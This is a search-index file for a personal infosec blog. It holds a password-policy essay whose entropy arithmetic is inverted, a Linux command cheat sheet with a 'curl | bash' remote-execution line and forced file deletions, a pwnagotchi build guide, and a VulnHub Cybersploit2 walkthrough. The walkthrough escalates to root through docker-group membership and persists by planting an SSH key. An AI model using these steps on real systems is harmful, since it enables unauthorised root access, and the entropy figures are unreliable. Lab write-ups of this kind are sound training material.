{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hey there! Welcome to my site! Chances are you are here because either We met in person and I gave you this link. Your awesome by the way :) You got this link from a job application I submitted to your company Your a rando on the internet who just stumbled on this website In any case your welcome to stick around for awhile. Feel free to take a look at some of the stuff I've made on my GitHub or read some of my posts on this blog. A little bit about me I'm just an avid Infosec enthusiast that likes to write code that does things and I also have opinions about how security should be done and what needs to be done industry wide to improve. If you feel the need to contact me or just want to chat You can hit me up at my email directly at shane.bradfield1@gmail.com or by reaching out via any of the social media buttons at the bottom of any page.","title":"Welcome to my site"},{"location":"#a-little-bit-about-me","text":"I'm just an avid Infosec enthusiast that likes to write code that does things and I also have opinions about how security should be done and what needs to be done industry wide to improve.","title":"A little bit about me"},{"location":"#if-you-feel-the-need-to-contact-me-or-just-want-to-chat","text":"You can hit me up at my email directly at shane.bradfield1@gmail.com or by reaching out via any of the social media buttons at the bottom of any page.","title":"If you feel the need to contact me or just want to chat"},{"location":"Blog/2017-1-29-Hello-World/","text":"Hey guys this is my first blog post I will be experimenting with it more in my free time so keep an eye out for updates!","title":"HELO WRLD"},{"location":"Blog/2017-1-30-A-critisism-of-Password-policies/","text":"In my short time in the industry I have noticed some disturbing things about passwords and the common policies that govern them. It seems that no matter the requirements that are imposed on any given corporation there is a lot of overlap no matter if you are trying comply with PCI, HIPPA, NIST and others. This poses a problem because you will see a lot of common policies across a ton of different industries and the most common policies I see are something along these lines: Password Policy 8 characters Minimum 1 Uppercase 1 Number 1 Special Character Passwords must be changed once every 90 days While that may seem okay at first glance; over time you begin to see a lot of this Password1! Yes, that\u2019s right! It is the year 2017 and I am still seeing this password used in almost every environment I have seen. While xkcd may have gotten something right with their comic on passwords and entropy, they got their math wrong. So, let\u2019s break this down and get the math right. The English language contains 26 lowercase and 26 uppercase characters so right there in a single 1 character string you have 52 possible characters. Now if we consider including the numbers 0-9 that\u2019s an additional 10 characters with for a total of 62 and then we add the special characters which adds an additional 32 possible characters. Wait wait wait I hear you saying 32 characters? Bro do you even count? Yes, I do and you are not considering characters like the brackets, greater or less than and quotes as well as tilde and backtick. So, if you are not using Alt-codes, the typical QWERTY keyboard can give you a total of 94 characters to work with. So, to do this calculation at home you take the number of characters of your password and you rise it to the power of how many characters in that set you have. So, for the password in the comic Tr0ub4dor&3 you have upper, lower, numeric and special characters across 11 characters so the math looks like 11^94 or 7.77 * 10^97. Now to determine if it is strong or not, we run it against an unrealistically strong cracker. So, for this example let\u2019s say I am going to try to break this at 1 trillion password attempts per second. It would still take 2.466 * 10^78 years at the most to break out using a brute force method. Now let\u2019s take a look at their proposed solution of correct horse battery staple . In this case, you have 28 characters including spaces between the words using just the lowercase set so we have 27 characters to work with so 28^27 is 1.18 * 10^39. Which is a significantly smaller space than the first password it would still take 37.5 * 10^18 years at the most to break out fully. Let's recap so far, we have seen 2 examples of really good passwords that should last you until long after your death. However, they are both weak to one specific type of attack: The Man-in-the-middle (MiTM) attack. In this attack the attacker sits in-between the user and the authentication service as to intercept the authentication tokens as they pass from the user to the service. At this point all the entropy in the world won\u2019t save you because the attacker already has your password. So how do we combat this? My recommendation is to implement two factor authentication (2FA) on every service you use. This is a type of authentication that uses a 6-8 digit numeric code that changes once every 30-60 seconds. This is sent to you out of band through something like an SMS message or RSA token. If that code is wrong, even if the username and password is right, the service will not authenticate you. In doing so we can limit an attackers window of opportunity to crack a password to 30-60 seconds. But how can we make it stronger? Well the use of passphrase while unpopular is always a feasible option. So, for example this very sentence could be your next password. But that rises another question if we begin using this type of password wont attackers just start cracking based on words in the English language with spaces in between? Yes, I predict they would but here we run into the entropy question again as the full 20 volume Oxford English Dictionary contains 171,476 individual entries for words so for the example above of an 11-word sentence it would take a cracker trying a trillion word combinations per second 2.255 * 10^178554 years to completely crack out. Which is longer than the projected heat death of the known universe and we didn\u2019t even calculate for punctuation, commas, spaces or even uppercase characters which would take even longer. But how do we make this a better password policy using this criterion. Here are my proposed changes Password Policy 10-word minimum 1 Uppercase letter 1 Punctuation Mark 2FA Enabled Passwords must be changed once every year or whenever a user feels they might have been compromised","title":"A criticism of password policies"},{"location":"Blog/2018-11-04-Command-Notes/","text":"A collection of useful commands #List all files in long listing in human readable format sorted by time ls -halt #Find files in a directory that are larger than 250MB and for each file found ls them find / -type f -size +250M -exec ls -halt {} \\; #Removes the files found in the above command find / -type f -size +250M -exec rm -f {} \\; #Removes the files older than 90 days in /var/log/ find /var/log/* -mtime +90 -type f -exec rm -f {} \\; #Finds where java is then follows all the symlinks down to where its actually installed readlink -f `which java` #Create the user username, assigns thier home directory to /home/username, and set their shell to /bin/bash useradd -m -d /home/username -s /bin/bash username #Wipes out the contents of a file and then removes it; Faster than just removing a very large file cat /dev/null > /path/to/file; rm -f /path/to/file #Change ownership on a directory recursively chown -R username:usergroup /path/to/directory #Preserve the last 100 lines of a file wipe out the rest echo $(tail -n 100 /path/to/file) > /path/to/file #Run a file hosted on a webserver localy curl -sSL http://webserver.web/path/to/raw/file | bash -s argument1 argument2 argument3 #Kickoff a process in the background under its own pid nohup longRunningCommandHere > longRunningCommand.log 2>&1 & #Set up a user so its password never expires chage -E 1 -I 1 -m 0 -M 99999 -W 7 username; chage -l username #Find all of the copies of Apache Struts running on a system and return their version numbers #!/bin/bash JarFiles=$(find / -type f -name struts.jar) for Jar in $JarFiles; do JarVer=$(unzip -p \"$Jar\" META-INF/MANIFEST.MF | grep Specification-Version | awk -F: '{{print $2}}') echo \"$Jar|$JarVer\" >> \"{parameter \"outputFile\"}\" done du / | sort -n | less","title":"Command Notes"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/","text":"In this industry I see a lot a great projects. Code stacked in great monoliths towering over us all. But at the end of the day that all it is line after line of words in a document. Its a real shame that so many great projects don't get the props they deserve because they look just like the rest. So today I figured I would go over how I breathed new life into my pwnagotchi killerB. Step 1: Deciding on a case and ordering parts The case you pick will ultimately decide what kind of environment your pwnagotchi will be used in and how much hassle you are willing to deal with. Take some time to consider the case that you pick and what your needs are for the project. For me I had several criteria that I knew I had to meet me selecting mine. Weight No more than a pound and a half grand total Housing Something that I could easily decorate Does not conduct electricity Slip resistant Supports a 2.13in eInk Display Optional Features Battery that will get me more than 1 hour of run time by itself While I was in this step I began ordering some of the base components I would need for the project. An SD Card I like to have some space on my project to mess around so I went with a 128GB Sandisk but consult the project docs if you would like to go lower than 16GB A Raspberry Pi I went with the Zero W v1.1 on this build but I hear that the pwnagotchi will support 5Ghz on the Pi 4 model A Battery pack Ended up going with a PiSugar (1200 mAh Variant) A Screen For me the Waveshare 2.13in eInk display was the only one working when I sourced these parts again check the documentation on screens that are supported Ultimately I ended up going with the PiSugar XL Case for the Raspberry Pi Zero W . In my eyes this case met all of the things that I wanted in this project of course this led me to my next big problem ... Step 2: Sourcing the materials So to my everlasting shame I don't own a 3D Printer nor do I have easy access to one. 3D modeling is a gap in my knowledge that I hope to address one day but I will be saving that for another project. Luckily for me there are plenty of very reputable business that will print just about anything you send them so long as they can read the files and it doesn't go against their terms of service. In my case I decided to go with Shapeways. For those who don't know who they are Shapeways is a Dutch-founded, New York-based 3D printing marketplace and service, startup company. Users design and upload 3D printable files, and Shapeways prints the objects for them or others. Users can have objects printed in over 55 materials and finishes, these include: plastics, precious metals, steel and food-safe ceramics, which were discontinued and have been replaced by porcelain materials. As of 2019, Shapeways printed and sold more than ten million user-created objects. - https://en.wikipedia.org/wiki/Shapeways however there are many other companies that one could go with. Just google around for 3d printing services and I'm sure you will find one that fits your needs. If you choose to go the same route that I did then its as simple as logging in, uploading the STL files that you got from the Pi Sugar link from above and checking out. They will go ahead and inspect the models to let you know if there may be any issues with manufacturing and print the parts in your selected material. Once that's done they go ahead and ship you the parts. In my case the total ending up coming to $46.90 USD but deviating from the materials that I selected may change the cost. Step 3: Decorating Once all of the parts and peace's have been delivered its time to get to decorating! Remember that your pwnagotchi is as individual as you are and just like how I would assume you don't like looking bad neither does your pwnagotchi! For this build I will be using a base color of BLACK 2.0 from Culture Hustle as it is acrylic paint that works well on plastics and as an added bonus has some very interesting light absorbing properties that I hope to use in future projects. I will also be using some Citadel layer paint in Phalanx Yellow for the detail work. This paint was chosen simply for aesthetic reasons and because its commonly used on Warhammer 40k figures which makes it very compatible with commonly used plastics. Once I had all of the things I needed it was time to get decorating! As you can see by this picture the Black paint is very thick; I was able to accomplish what you see here in one coat. This picture was taken while I was testing the compatibility of this paint with the plastic; upon finding no problems with it I knew it was safe to proceed with the rest of the parts. Once all the parts were painted they were set aside for 24 hours to cure completely. I've seen a couple of videos from the artist claiming that this paint actually gets darker the longer it cures up to 24 hours so I wanted to make sure I got the most out of the dark color. Once the first round of drying was done it is time to add the details! To get these stripes I just used some masking tape to mark of an area and begin to generously add the Phalanx Yellow taking care to let it dry before adding a second coat and removing the masking tape. This process was repeated twice, once for each stripe. Step 4: Bringing it all together Once everything is good and dry you should be at the point where its all ready to come together. You can begin by first putting the button into place and then adding the PiSugar board to the bottom of the case. Following that insert the plastic screws that come with it. I found that using the battery attached to the board and sliding it over so that it holds 2 of the screw's in place while you hold the other two with your fingers is a good way to keep them all in place while you insert the Pi with flashed SD card into the other side. Once that's done add the plastic spacers that come with and the plastic nuts and your good to go. Please note that at this point its a good time to do a quick test of the board to make sure that everything is functioning as expected. Click the button once to turn on the PiSugar and twice to turn it off. The 4 lights on that board will glow indicating a full charge and you should see that through the 4 holes in the side of the case any less than 4 lights indicates a discharged battery of 25%, 50%, 75% and 100% respectively. Additionally you should also see the raspberry pi indicator light flashing indicating a boot up and then it will blink 10 times ... I think after the pwnagotchi software and config have been loaded. An important note about changing, under no circumstances should you charge the PiSugar and run power to the Pi at the same time. The manufacturer has noted this has potential to short out the boards in the best case and may cause a fire in the worst case due to overcharging. If you run power to the PiSugar like seen in the photo it will keep the Pi on while it changes, this is normal behavior. Additionally I have seen no problems so far with running a data only line to a computer to tinker on the data port while I am float charging the battery on the PiSugar but I accept no responsibility in the event something happens to either you or your property. Tinker and charge at your own risk. If you get to this point your pwnagotchi should look something like this. Please don't be and idiot like me and forget to remove any heatsinks on the Pi before adding the eInk Display. Any heatsinks present will most assuredly destroy the back of your eInk and you will have to order a new one if you fuck it up. There is not enough room in this case for both. Once you have heeded the warning above you can line up your eInk Display and add it to the header pins. This done you can snap on the back and front panels and take your brand new and beautiful pwnagotchi for a walk!","title":"pwnagotchi.beautify();"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-1-deciding-on-a-case-and-ordering-parts","text":"The case you pick will ultimately decide what kind of environment your pwnagotchi will be used in and how much hassle you are willing to deal with. Take some time to consider the case that you pick and what your needs are for the project. For me I had several criteria that I knew I had to meet me selecting mine. Weight No more than a pound and a half grand total Housing Something that I could easily decorate Does not conduct electricity Slip resistant Supports a 2.13in eInk Display Optional Features Battery that will get me more than 1 hour of run time by itself While I was in this step I began ordering some of the base components I would need for the project. An SD Card I like to have some space on my project to mess around so I went with a 128GB Sandisk but consult the project docs if you would like to go lower than 16GB A Raspberry Pi I went with the Zero W v1.1 on this build but I hear that the pwnagotchi will support 5Ghz on the Pi 4 model A Battery pack Ended up going with a PiSugar (1200 mAh Variant) A Screen For me the Waveshare 2.13in eInk display was the only one working when I sourced these parts again check the documentation on screens that are supported Ultimately I ended up going with the PiSugar XL Case for the Raspberry Pi Zero W . In my eyes this case met all of the things that I wanted in this project of course this led me to my next big problem ...","title":"Step 1: Deciding on a case and ordering parts"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-2-sourcing-the-materials","text":"So to my everlasting shame I don't own a 3D Printer nor do I have easy access to one. 3D modeling is a gap in my knowledge that I hope to address one day but I will be saving that for another project. Luckily for me there are plenty of very reputable business that will print just about anything you send them so long as they can read the files and it doesn't go against their terms of service. In my case I decided to go with Shapeways. For those who don't know who they are Shapeways is a Dutch-founded, New York-based 3D printing marketplace and service, startup company. Users design and upload 3D printable files, and Shapeways prints the objects for them or others. Users can have objects printed in over 55 materials and finishes, these include: plastics, precious metals, steel and food-safe ceramics, which were discontinued and have been replaced by porcelain materials. As of 2019, Shapeways printed and sold more than ten million user-created objects. - https://en.wikipedia.org/wiki/Shapeways however there are many other companies that one could go with. Just google around for 3d printing services and I'm sure you will find one that fits your needs. If you choose to go the same route that I did then its as simple as logging in, uploading the STL files that you got from the Pi Sugar link from above and checking out. They will go ahead and inspect the models to let you know if there may be any issues with manufacturing and print the parts in your selected material. Once that's done they go ahead and ship you the parts. In my case the total ending up coming to $46.90 USD but deviating from the materials that I selected may change the cost.","title":"Step 2: Sourcing the materials"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-3-decorating","text":"Once all of the parts and peace's have been delivered its time to get to decorating! Remember that your pwnagotchi is as individual as you are and just like how I would assume you don't like looking bad neither does your pwnagotchi! For this build I will be using a base color of BLACK 2.0 from Culture Hustle as it is acrylic paint that works well on plastics and as an added bonus has some very interesting light absorbing properties that I hope to use in future projects. I will also be using some Citadel layer paint in Phalanx Yellow for the detail work. This paint was chosen simply for aesthetic reasons and because its commonly used on Warhammer 40k figures which makes it very compatible with commonly used plastics. Once I had all of the things I needed it was time to get decorating! As you can see by this picture the Black paint is very thick; I was able to accomplish what you see here in one coat. This picture was taken while I was testing the compatibility of this paint with the plastic; upon finding no problems with it I knew it was safe to proceed with the rest of the parts. Once all the parts were painted they were set aside for 24 hours to cure completely. I've seen a couple of videos from the artist claiming that this paint actually gets darker the longer it cures up to 24 hours so I wanted to make sure I got the most out of the dark color. Once the first round of drying was done it is time to add the details! To get these stripes I just used some masking tape to mark of an area and begin to generously add the Phalanx Yellow taking care to let it dry before adding a second coat and removing the masking tape. This process was repeated twice, once for each stripe.","title":"Step 3: Decorating"},{"location":"Blog/2019-10-08-pwnagotchi-beautify/#step-4-bringing-it-all-together","text":"Once everything is good and dry you should be at the point where its all ready to come together. You can begin by first putting the button into place and then adding the PiSugar board to the bottom of the case. Following that insert the plastic screws that come with it. I found that using the battery attached to the board and sliding it over so that it holds 2 of the screw's in place while you hold the other two with your fingers is a good way to keep them all in place while you insert the Pi with flashed SD card into the other side. Once that's done add the plastic spacers that come with and the plastic nuts and your good to go. Please note that at this point its a good time to do a quick test of the board to make sure that everything is functioning as expected. Click the button once to turn on the PiSugar and twice to turn it off. The 4 lights on that board will glow indicating a full charge and you should see that through the 4 holes in the side of the case any less than 4 lights indicates a discharged battery of 25%, 50%, 75% and 100% respectively. Additionally you should also see the raspberry pi indicator light flashing indicating a boot up and then it will blink 10 times ... I think after the pwnagotchi software and config have been loaded. An important note about changing, under no circumstances should you charge the PiSugar and run power to the Pi at the same time. The manufacturer has noted this has potential to short out the boards in the best case and may cause a fire in the worst case due to overcharging. If you run power to the PiSugar like seen in the photo it will keep the Pi on while it changes, this is normal behavior. Additionally I have seen no problems so far with running a data only line to a computer to tinker on the data port while I am float charging the battery on the PiSugar but I accept no responsibility in the event something happens to either you or your property. Tinker and charge at your own risk. If you get to this point your pwnagotchi should look something like this. Please don't be and idiot like me and forget to remove any heatsinks on the Pi before adding the eInk Display. Any heatsinks present will most assuredly destroy the back of your eInk and you will have to order a new one if you fuck it up. There is not enough room in this case for both. Once you have heeded the warning above you can line up your eInk Display and add it to the header pins. This done you can snap on the back and front panels and take your brand new and beautiful pwnagotchi for a walk!","title":"Step 4: Bringing it all together"},{"location":"Blog/2020-07-19-Boot2Root-Cybersploit2/","text":"Cybersploit 2 can be found and downloaded at https://www.vulnhub.com/entry/cybersploit-2,511/ Cybersploit 2 was created by Shailendra Kumar Vishwakarma and you can find him on Twitter here https://twitter.com/CyberSploit1 Booting up this VM is as simple as getting it downloaded and stood up in Virtual Box I had to tweak its network adapter to make it work on my network but once its up and running we can log into our attacking box of choice and start with some basic recon. Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 22:07 CDT Nmap scan report for 10.0.0.158 Host is up (0.00081s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA) | 256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA) |_ 256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos)) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) |_http-title: CyberSploit2 MAC Address: 08:00:27:30:A7:AD (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.81 ms 10.0.0.158 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds Kicking off an nmap scan we can see that this VM seems be a CentOS install running HTTP (Apache/2.4.37) and SSH (OpenSSH 8.0 (protocol 2.0)) on it. Were gonna go after HTTP first since in my experience SSH has always been a tougher nut to crack. In this case I am going to kick off a Nikto and dirb scan to see what kind of directory's we can find and if there are any obvious vulns in that config. - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.0.0.158 + Target Hostname: 10.0.0.158 + Target Port: 80 + Start Time: 2020-07-18 22:08:24 (GMT-5) --------------------------------------------------------------------------- + Server: Apache/2.4.37 (centos) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + 8698 requests: 0 error(s) and 7 item(s) reported on remote host + End Time: 2020-07-18 22:08:36 (GMT-5) (12 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Jul 18 22:09:51 2020 URL_BASE: http://10.0.0.158/ WORDLIST_FILES: /opt/dirb/wordlists/big.txt ----------------- GENERATED WORDS: 20458 ---- Scanning URL: http://10.0.0.158/ ---- + http://10.0.0.158/cgi-bin/ (CODE:403|SIZE:217) ==> DIRECTORY: http://10.0.0.158/noindex/ ---- Entering directory: http://10.0.0.158/noindex/ ---- ==> DIRECTORY: http://10.0.0.158/noindex/common/ + http://10.0.0.158/noindex/index (CODE:200|SIZE:4006) ---- Entering directory: http://10.0.0.158/noindex/common/ ---- ==> DIRECTORY: http://10.0.0.158/noindex/common/css/ ==> DIRECTORY: http://10.0.0.158/noindex/common/fonts/ ==> DIRECTORY: http://10.0.0.158/noindex/common/images/ ---- Entering directory: http://10.0.0.158/noindex/common/css/ ---- + http://10.0.0.158/noindex/common/css/styles (CODE:200|SIZE:71634) ---- Entering directory: http://10.0.0.158/noindex/common/fonts/ ---- ---- Entering directory: http://10.0.0.158/noindex/common/images/ ---- ----------------- END_TIME: Sat Jul 18 22:10:30 2020 DOWNLOADED: 122748 - FOUND: 3 From the scan outputs we can see that Nikto is also seeing paths that are common with Apache configs which we can combine with what we saw in the nmap scan to more or less confirm at this point that we have Apache running here. We also know now we have a bunch of files we can look at here. The first thing that catches my eye is the /cgi-bin/ directory. This path is used by Apace installs to hold onto any executable code that is needed to make a website run; if unprotected in some cases an attacker can use this path to their advantage as it provides a foothold into the environment. In this case however we are getting an HTTP 403 Unauthorized back which means we will not be able to use it to our advantage. Now that we have some basic paths to look at we can begin to pull them down and start looking through the pages to see if there are any juicy tidbits left. From this image we can see that upon browsing to the webserver we have ourselves a table of usernames and passwords. Thinking back to the original nmap scan we did we saw SSH open on this VM and trying each pair in turn against SSH none of them seem to work in their current form. However one of the usernames stands out as different from the rest \"D92:=6?5C2\" while this could be a service account login I think more than a few languages may have issues parsing those characters in the same string and that doesn't seem like something that a developer would want to deal with. Looking for more clues we then can cat through the source of the page to find a comment hidden way that the bottom \"\\<!----------ROT47---------->\" Passing the odd stings we found through ROT47 we find that D92:=6?5C2 comes out to \"shailendra\" and its next field 4J36CDA=@:E` comes out as \"cybersploit1\". Passing these back into SSH produces a valid login for the VM and we now have compromised this account. Listing through this accounts home directory we find that Shailendra left us a clue as to what to look at next. [shailendra@localhost ~]$ cat hint.txt docker It seems he wants us to take a closer look into docker lets start by confirming its installed. [shailendra@localhost ~]$ find / -name docker -type f 2>/dev/null -exec ls -halt {} \\; -rwxr-xr-x. 1 root root 82M Jun 22 21:18 /usr/bin/docker -rw-r--r--. 1 root root 114K Jun 22 21:09 /usr/share/bash-completion/completions/docker Docker looks to be there but do we have permissions to access it? [shailendra@localhost ~]$ id uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) Looks like we do. This is a very dangerous prospect because I now as an attacker am part of the docker group on a box that its installed on. This is dangerous because as we have confirmed in the find docker seems to be installed under root which is the default way to do that. The problem this introduces that that any container that docker launches will inherit those rights from the docker program. In his blog post on the topic Chris Foster lays out a kill chain that explains how one could go about exploiting this in the wild to preform privilege escalation up to the root account on the local docker host machine. https://fosterelli.co/privilege-escalation-via-docker In a nutshell this exploit works by telling docker to run a container that mounts the root filesystem \"/\" to \"/hostOS\" inside of that container from there the container will then chroot to /hostOS and launch a shell. Now since the container is launching the shell that will then inherit the privilege of its parent process (in this case docker which is running under root on the host node) effectively dropping us to a root shell running on the host node. [shailendra@localhost ~]$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease Unable to find image 'chrisfosterelli/rootplease:latest' locally latest: Pulling from chrisfosterelli/rootplease a4a2a29f9ba4: Pull complete 127c9761dcba: Pull complete d13bf203e905: Pull complete 4039240d2e0b: Pull complete 16a91ffa6f29: Pull complete Digest: sha256:eb6be3ee1f9b2fd6e3ae6d4fda81a80bfdf21aad9bde6f1a5234f1baa58d4bb3 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell sh-4.4# whoami; id root uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:spc_t:s0 We can see that if we list out the processes with ps -ef --forest, our new /bin/sh shell is running with these privlages root 826 1 0 01:28 ? 00:00:01 /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P root 827 1 0 01:28 ? 00:00:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256- root 1709 827 0 02:48 ? 00:00:00 \\_ sshd: shailendra [priv] shailen+ 1725 1709 0 02:48 ? 00:00:00 \\_ sshd: shailendra@pts/0 shailen+ 1726 1725 0 02:48 pts/0 00:00:00 \\_ -bash shailen+ 1932 1726 0 03:23 pts/0 00:00:00 \\_ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease root 834 1 0 01:28 ? 00:00:22 /usr/bin/containerd root 1975 834 0 03:23 ? 00:00:00 \\_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v root 1992 1975 0 03:23 pts/0 00:00:00 \\_ /bin/bash exploit.sh root 2021 1992 0 03:23 pts/0 00:00:00 \\_ /bin/sh root 2042 2021 0 03:27 pts/0 00:00:00 \\_ ps -ef --forest What I find super interesting about this is our shell is /bin/sh on the host node however because of the chroot we did its running inside of the context of that container we launched. Meaning that if we were to loose the container we would also loose our shell so it would be wise at this point to establish some persistence in this VM so the fictional SysAdmin or Blue Team has a harder time kicking us out. I normally end up doing this by dropping an SSH key into /root/.ssh/authorized_keys that I generated on the attacking machine and logging in using it to get a proper root shell. [root@localhost ~]# whoami; id; root uid=0(root) gid=0(root) groups=0(root),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 From here its childs play to ls the files in /root and cat out flag.txt [root@localhost ~]# ls anaconda-ks.cfg flag.txt get-docker.sh logs} [root@localhost ~]# cat flag.txt __ ___ _ __ ___ __ _____ __ / /` / / \\ | |\\ | / /`_ | |_) / /\\ | | ( (` \\_\\_, \\_\\_/ |_| \\| \\_\\_/ |_| \\ /_/--\\ |_| _)_) Pwned CyberSploit2 POC share it with me twitter@cybersploit1 Thanks !","title":"Boot2Root Walkthrough - Cybersploit2"},{"location":"Blog/2021-08-24-Doom/","text":"I putting Doom on things! Its a great game so I've decided to embed a copy of it here for future projects. Controls: Arrow keys to move. Left Control to Shoot. Spacebar is your action button.","title":"Doom"}]}